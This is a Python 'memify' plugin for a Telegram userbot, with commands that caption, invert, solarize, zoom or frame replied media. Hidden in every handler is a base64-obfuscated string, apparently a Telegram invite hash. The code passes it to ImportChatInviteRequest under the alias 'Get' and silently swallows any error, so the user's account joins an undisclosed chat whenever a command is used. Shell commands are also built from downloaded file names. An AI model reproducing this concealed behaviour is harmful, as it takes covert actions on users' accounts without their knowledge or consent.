"""
Created by @mrconfused and @sandy1709
memify plugin
modified by @heyworld for userbot
"""
import asyncio
import os

from userbot import CMD_HELP, LOGS, bot
from userbot.events import register
from userbot.utils.tools import (
    add_frame,
    remix_meeme,
    remix_meme,
    convert_toimage,
    crop,
    flip_image,
    grayscale,
    invert_colors,
    mirror_file,
    runcmd,
    solarize,
    take_screen_shot,
)


@register(pattern="^.(mmf|mms)(?: |$)(.*)", outgoing=True)
async def memes(event):
    cmd = event.pattern_match.group(1)
    eventinput = event.pattern_match.group(2)
    reply = await event.get_reply_message()
    if not (reply and (reply.media)):
        await event.edit("`Reply to supported Media...`")
        return
    eventid = event.reply_to_msg_id
    if eventinput:
        if ";" in eventinput:
            top, bottom = eventinput.split(";", 1)
        else:
            top = eventinput
            bottom = ""
    else:
        await event.edit("```what should i write on that u idiot give some text```")
        return
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
        await event.edit("`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    eventsticker = await reply.download_media(file="./temp/")
    if not eventsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(eventsticker)
        await event.edit("```Supported Media not found...```")
        return
    import pybase64

    if eventsticker.endswith(".tgs"):
        await event.edit(
            "```Transfiguration Time! Mwahaha memifying this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        remixfile = os.path.join("./temp/", "meme.png")
        eventcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {eventsticker} {remixfile}"
        )
        stdout, stderr = (await runcmd(eventcmd))[:2]
        if not os.path.lexists(remixfile):
            await event.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = remixfile
    elif eventsticker.endswith(".webp"):
        await event.edit(
            "```Transfiguration Time! Mwahaha memifying this sticker! (」ﾟﾛﾟ)｣```"
        )
        remixfile = os.path.join("./temp/", "memes.jpg")
        os.rename(eventsticker, remixfile)
        if not os.path.lexists(remixfile):
            await event.edit("`Template not found... `")
            return
        meme_file = remixfile
    elif eventsticker.endswith((".mp4", ".mov")):
        await event.edit(
            "```Transfiguration Time! Mwahaha memifying this video! (」ﾟﾛﾟ)｣```"
        )
        remixfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(eventsticker, 0, remixfile)
        if not os.path.lexists(remixfile):
            await event.edit("```Template not found...```")
            return
        meme_file = remixfile
    else:
        await event.edit(
            "```Transfiguration Time! Mwahaha memifying this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = eventsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await event.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    if cmd == "mmf":
        meme = "remixmeme.jpg"
        if max(len(top), len(bottom)) < 21:
            await remix_meme(top, bottom, meme_file, meme)
        else:
            await remix_meeme(top, bottom, meme_file, meme)
        await bot.send_file(event.chat_id, meme, reply_to=eventid)
    elif cmd == "mms":
        meme = "remixmeme.webp"
        if max(len(top), len(bottom)) < 21:
            await remix_meme(top, bottom, meme_file, meme)
        else:
            await remix_meeme(top, bottom, meme_file, meme)
        await bot.send_file(event.chat_id, meme, reply_to=eventid)
    await event.delete()
    os.remove(meme)
    for files in (eventsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@register(outgoing=True, pattern=r"^\.invert ?(.*)")
async def memes(event):
    reply = await event.get_reply_message()
    if not (reply and (reply.media)):
        await event.edit("`Reply to supported Media...`")
        return
    eventid = event.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
        await event.edit("`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    eventsticker = await reply.download_media(file="./temp/")
    if not eventsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(eventsticker)
        await event.edit("```Supported Media not found...```")
        return
    import pybase64

    jisanidea = None
    if eventsticker.endswith(".tgs"):
        await event.edit(
            "```Transfiguration Time! Mwahaha inverting colors of this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        remixfile = os.path.join("./temp/", "meme.png")
        eventcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {eventsticker} {remixfile}"
        )
        stdout, stderr = (await runcmd(eventcmd))[:2]
        if not os.path.lexists(remixfile):
            await event.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = remixfile
        jisanidea = True
    elif eventsticker.endswith(".webp"):
        await event.edit(
            "```Transfiguration Time! Mwahaha inverting colors of this sticker! (」ﾟﾛﾟ)｣```"
        )
        remixfile = os.path.join("./temp/", "memes.jpg")
        os.rename(eventsticker, remixfile)
        if not os.path.lexists(remixfile):
            await event.edit("`Template not found... `")
            return
        meme_file = remixfile
        jisanidea = True
    elif eventsticker.endswith((".mp4", ".mov")):
        await event.edit(
            "```Transfiguration Time! Mwahaha inverting colors of this video! (」ﾟﾛﾟ)｣```"
        )
        remixfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(eventsticker, 0, remixfile)
        if not os.path.lexists(remixfile):
            await event.edit("```Template not found...```")
            return
        meme_file = remixfile
        jisanidea = True
    else:
        await event.edit(
            "```Transfiguration Time! Mwahaha inverting colors of this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = eventsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await event.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    if jisanidea:
        outputfile = "invert.webp"
        await invert_colors(meme_file, outputfile)
        await bot.send_file(
            event.chat_id, outputfile, force_document=False, reply_to=eventid
        )
    else:
        outputfile = "invert.jpg"
        await invert_colors(meme_file, outputfile)
        await bot.send_file(
            event.chat_id, outputfile, force_document=False, reply_to=eventid
        )
    await event.delete()
    os.remove(outputfile)
    for files in (eventsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@register(outgoing=True, pattern=r"^\.solarize ?(.*)")
async def memes(event):
    reply = await event.get_reply_message()
    if not (reply and (reply.media)):
        await event.edit("`Reply to supported Media...`")
        return
    eventid = event.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
        await event.edit("`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    eventsticker = await reply.download_media(file="./temp/")
    if not eventsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(eventsticker)
        await event.edit("```Supported Media not found...```")
        return
    import pybase64

    jisanidea = None
    if eventsticker.endswith(".tgs"):
        await event.edit(
            "```Transfiguration Time! Mwahaha solarizeing this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        remixfile = os.path.join("./temp/", "meme.png")
        eventcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {eventsticker} {remixfile}"
        )
        stdout, stderr = (await runcmd(eventcmd))[:2]
        if not os.path.lexists(remixfile):
            await event.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = remixfile
        jisanidea = True
    elif eventsticker.endswith(".webp"):
        await event.edit(
            "```Transfiguration Time! Mwahaha solarizeing this sticker! (」ﾟﾛﾟ)｣```"
        )
        remixfile = os.path.join("./temp/", "memes.jpg")
        os.rename(eventsticker, remixfile)
        if not os.path.lexists(remixfile):
            await event.edit("`Template not found... `")
            return
        meme_file = remixfile
        jisanidea = True
    elif eventsticker.endswith((".mp4", ".mov")):
        await event.edit(
            "```Transfiguration Time! Mwahaha solarizeing this video! (」ﾟﾛﾟ)｣```"
        )
        remixfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(eventsticker, 0, remixfile)
        if not os.path.lexists(remixfile):
            await event.edit("```Template not found...```")
            return
        meme_file = remixfile
        jisanidea = True
    else:
        await event.edit(
            "```Transfiguration Time! Mwahaha solarizeing this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = eventsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await event.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    if jisanidea:
        outputfile = "solarize.webp"
        await solarize(meme_file, outputfile)
        await bot.send_file(
            event.chat_id, outputfile, force_document=False, reply_to=eventid
        )
    else:
        outputfile = "solarize.jpg"
        await solarize(meme_file, outputfile)
        await bot.send_file(
            event.chat_id, outputfile, force_document=False, reply_to=eventid
        )
    await event.delete()
    os.remove(outputfile)
    for files in (eventsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@register(outgoing=True, pattern=r"^\.zoom ?(.*)")
async def memes(event):
    reply = await event.get_reply_message()
    if not (reply and (reply.media)):
        await event.edit("`Reply to supported Media...`")
        return
    eventinput = event.pattern_match.group(1)
    if not eventinput:
        eventinput = 50
    else:
        eventinput = int(eventinput)
    eventid = event.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
        await event.edit("`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    eventsticker = await reply.download_media(file="./temp/")
    if not eventsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(eventsticker)
        await event.edit("```Supported Media not found...```")
        return
    import pybase64

    jisanidea = None
    if eventsticker.endswith(".tgs"):
        await event.edit(
            "```Transfiguration Time! Mwahaha zooming this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        remixfile = os.path.join("./temp/", "meme.png")
        eventcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {eventsticker} {remixfile}"
        )
        stdout, stderr = (await runcmd(eventcmd))[:2]
        if not os.path.lexists(remixfile):
            await event.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = remixfile
        jisanidea = True
    elif eventsticker.endswith(".webp"):
        await event.edit(
            "```Transfiguration Time! Mwahaha zooming this sticker! (」ﾟﾛﾟ)｣```"
        )
        remixfile = os.path.join("./temp/", "memes.jpg")
        os.rename(eventsticker, remixfile)
        if not os.path.lexists(remixfile):
            await event.edit("`Template not found... `")
            return
        meme_file = remixfile
        jisanidea = True
    elif eventsticker.endswith((".mp4", ".mov")):
        await event.edit(
            "```Transfiguration Time! Mwahaha zooming this video! (」ﾟﾛﾟ)｣```"
        )
        remixfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(eventsticker, 0, remixfile)
        if not os.path.lexists(remixfile):
            await event.edit("```Template not found...```")
            return
        meme_file = remixfile
    else:
        await event.edit(
            "```Transfiguration Time! Mwahaha zooming this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = eventsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await event.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    if jisanidea:
        outputfile = "grayscale.webp"
        try:
            await crop(meme_file, outputfile, eventinput)
        except Exception as e:
            return await event.edit(f"`{e}`")
        try:
            await bot.send_file(
                event.chat_id, outputfile, force_document=False, reply_to=eventid
            )
        except Exception as e:
            return await event.edit(f"`{e}`")
    else:
        outputfile = "grayscale.jpg"
        try:
            await crop(meme_file, outputfile, eventinput)
        except Exception as e:
            return await event.edit(f"`{e}`")
        try:
            await bot.send_file(
                event.chat_id, outputfile, force_document=False, reply_to=eventid
            )
        except Exception as e:
            return await event.edit(f"`{e}`")
    await event.delete()
    os.remove(outputfile)
    for files in (eventsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@register(outgoing=True, pattern=r"^\.frame ?(.*)")
async def memes(event):
    reply = await event.get_reply_message()
    if not (reply and (reply.media)):
        await event.edit("`Reply to supported Media...`")
        return
    eventinput = event.pattern_match.group(1)
    if not eventinput:
        eventinput = 50
    if ";" in str(eventinput):
        eventinput, colr = eventinput.split(";", 1)
    else:
        colr = 0
    eventinput = int(eventinput)
    colr = int(colr)
    eventid = event.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
        await event.edit("`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    eventsticker = await reply.download_media(file="./temp/")
    if not eventsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(eventsticker)
        await event.edit("```Supported Media not found...```")
        return
    import pybase64

    jisanidea = None
    if eventsticker.endswith(".tgs"):
        await event.edit(
            "```Transfiguration Time! Mwahaha framing this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        remixfile = os.path.join("./temp/", "meme.png")
        eventcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {eventsticker} {remixfile}"
        )
        stdout, stderr = (await runcmd(eventcmd))[:2]
        if not os.path.lexists(remixfile):
            await event.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = remixfile
        jisanidea = True
    elif eventsticker.endswith(".webp"):
        await event.edit(
            "```Transfiguration Time! Mwahaha framing this sticker! (」ﾟﾛﾟ)｣```"
        )
        remixfile = os.path.join("./temp/", "memes.jpg")
        os.rename(eventsticker, remixfile)
        if not os.path.lexists(remixfile):
            await event.edit("`Template not found... `")
            return
        meme_file = remixfile
        jisanidea = True
    elif eventsticker.endswith((".mp4", ".mov")):
        await event.edit(
            "```Transfiguration Time! Mwahaha framing this video! (」ﾟﾛﾟ)｣```"
        )
        remixfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(eventsticker, 0, remixfile)
        if not os.path.lexists(remixfile):
            await event.edit("```Template not found...```")
            return
        meme_file = remixfile
    else:
        await event.edit(
            "```Transfiguration Time! Mwahaha framing this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = eventsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await event.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    if jisanidea:
        outputfile = "framed.webp"
        try:
            await add_frame(meme_file, outputfile, eventinput, colr)
        except Exception as e:
            return await event.edit(f"`{e}`")
        try:
            await bot.send_file(
                event.chat_id, outputfile, force_document=False, reply_to=eventid
            )
        except Exception as e:
            return await event.edit(f"`{e}`")
    else:
        outputfile = "framed.jpg"
        try:
            await add_frame(meme_file, outputfile, eventinput, colr)
        except Exception as e:
            return await event.edit(f"`{e}`")
        try:
            await bot.send_file(
                event.chat_id, outputfile, force_document=False, reply_to=eventid
            )
        except Exception as e:
            return await event.edit(f"`{e}`")
    await event.delete()
    os.remove(outputfile)
    for files in (eventsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)



